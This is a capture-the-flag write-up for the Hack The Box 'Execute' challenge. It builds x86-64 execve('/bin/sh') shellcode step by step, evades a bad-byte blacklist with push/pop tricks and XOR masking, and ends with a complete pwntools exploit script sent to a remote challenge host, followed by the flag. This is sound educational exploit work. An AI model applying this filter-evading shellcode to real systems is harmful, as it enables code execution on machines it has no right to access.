# Execute
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a76f9eac-e18c-4903-866d-87de83421845)


## Lessons Learned:
1. Stack-Based Exploitation.
2. Input bug which leads to direct code execution.
3. Implement ret2shellcode attack.
4. Craft custom shellcode to bypass bad bytes.
5. Using XOR operation to hide `/bin/sh` strings.

## DESCRIPTION:

## STEPS:
1. In this challenge, we're given a 64 bit binary, dynamically linked, and not stripped.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f25e6b28-c6a8-437f-9eeb-a910233a9085)


> BINARY PROTECTIONS

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2419960c-7a0c-408f-b15a-22e30567fc39)


2. Interesting! NX is disabled here. Hence it should be easier for us to gain RCE.
3. Upon reviewing the source code, our objective is very straightforward.
4. There is no buffer overflow, we just need to send our shellcode and it shall executed onto the stack.
5. BUT, the problem is there are several filters to our shellcode, which require us to craft our own shellcode.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/30e29a82-0d47-489d-82ab-a37bc286363b)

6. The easiest way to check which bytes is filtered, simply craft basic shellcode then compare which byte match the pattern.

> SCRIPT

```py
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

sh = process(exe)

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
        
shellcode = '''    
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
'''

sc = asm(shellcode)
for byte in sc:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

sh.interactive()
```

#### NOTES:

```
0x68732f6e69622f is a hex representation of strings "/bin/sh".

>>> from pwn import *
>>> print(p64(0x68732f6e69622f))
b'/bin/sh\x00'
>>> 
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/fed4fc6d-add2-4362-877b-0674e64ed767)


7. Got several bad bytes and it seems filtered for `/bin/sh` strings, NULL byte, and 59 or execve call.
8. Let's start by manipulate the 59 value. Actually we can just use 0x3a rather than 0x3b then add 1 byte to al (8 bit).

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/052f7d17-5df6-40d8-bc3e-2dee49ba34c8)


> UPDATED SHELLCODE

```asm
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
push 0x3a
pop rax
add al, 0x1
syscall
```

#### NOTES:

```asm
To obtain the correct asm instructions is using trial and error. If you pass:

mov rax, 0x3a
add al, 0x1

It shall bypassed the 59 filter, but introduced another bad bytes.
```


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/abd28ea7-6743-4bba-bfeb-af7a6a769908)


9. Great! Now let's try to bypass the NULL byte first.
10. Using the same method as previous to get rid of another bad byte introduced. I used `push` instruction to push the value first onto the stack pointer.

```asm
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6c5bf020-824b-42e0-bf19-885c48574d10)


11. Awesome! Just like what we're expect it to be. All the null bytes have been cleared.
12. The idea is still the same. But it's quite tricky.
13. I used XOR method to hide the `/bin/sh` strings.

### IDEA

```MD
1. Identify which key is suitable for 0x68732f6e69622f, that does not gave any null bad bytes.
2. Logic to hide the strings using XOR.
3. XOR it back to obtain the original strings and stored it onto the stack.

- So the idea is to push the KEY we identified previously onto the stack.

mov rax, KEY
push rax

## [+] At this point, RSP stored the our KEY.

- Then we perform the XOR operation of the key with BINSH strings, so we can obtain the XORed data.

mov rax, KEY ^ BINSH strings.

## [+] At this point RAX stored the XORed strings

xor [rsp], rax

## [+] At this point KEY stored on the stack is XORed with the previously XORed strings.

This operation resulting to "/bin/sh" strings.

Now then stored it back to RDI.
```

14. Great! Seems we have the idea, now the problem is to identify which KEY should resulting us no NULL Bytes.
15. Struggling enough to identify the correct key. Started by using `0xffffffffffffffff` but resulting to another bad bytes.
16. So I bruteforced it all the way until I met this KEY `0x2a2a2a2a2a2a2a2a`.

> FULL SHELLCODE

```asm
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ad612f74-612e-4815-8944-c49075486691)


17. Great! We gained RCE.

> FULL SCRIPT

```py
from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

# sh = process(exe)
sh = remote('94.237.49.212', 45920)

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
        
shellcode = '''    
mov rax, 0x2a2a2a2a2a2a2a2a
push rax

mov rax, 0x2a2a2a2a2a2a2a2a ^ 0x68732f6e69622f
xor [rsp], rax
mov rdi, rsp

push 0x0
pop rsi
push 0x0
pop rdx

push 0x3a
pop rax
add al, 0x1
syscall
'''

sc = asm(shellcode)
for byte in sc:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

sh.sendline(sc)
sh.interactive()
```

> REMOTE TEST

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8e53a6d8-6564-4f6b-98bc-68d4d84c27d1)


18. We've pwned it!

## FLAG

```
HTB{wr1t1ng_sh3llc0d3_1s_s0_c00l}
```
